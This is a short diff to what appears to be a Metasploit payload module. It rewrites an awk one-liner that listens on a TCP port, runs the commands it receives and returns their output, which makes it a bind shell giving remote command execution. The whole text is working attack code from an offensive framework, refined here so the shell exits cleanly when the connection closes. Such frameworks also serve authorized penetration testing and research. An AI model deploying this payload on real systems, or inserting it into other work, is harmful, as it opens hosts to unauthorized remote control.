@@ -8,7 +8,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 136
+  CachedSize = 140
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -51,17 +51,15 @@ module MetasploitModule
     awkcmd = <<~AWK
       awk 'BEGIN{
         s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";
-        while(1){
-          do{
-            s|&getline c;
-            if(c){
-              while((c|&getline)>0)print $0|&s;
-              close(c)
-            }
+        do{
+          if((s|&getline c)<=0)
+            break;
+          if(c){
+            while((c|&getline)>0)print $0|&s;
+            close(c)
           }
-          while(c!=\"exit\");
-          close(s)
-        }
+        } while(c!=\"exit\")
+        close(s)
       }'
     AWK
     awkcmd.gsub!("\n",'').gsub!('  ', '')
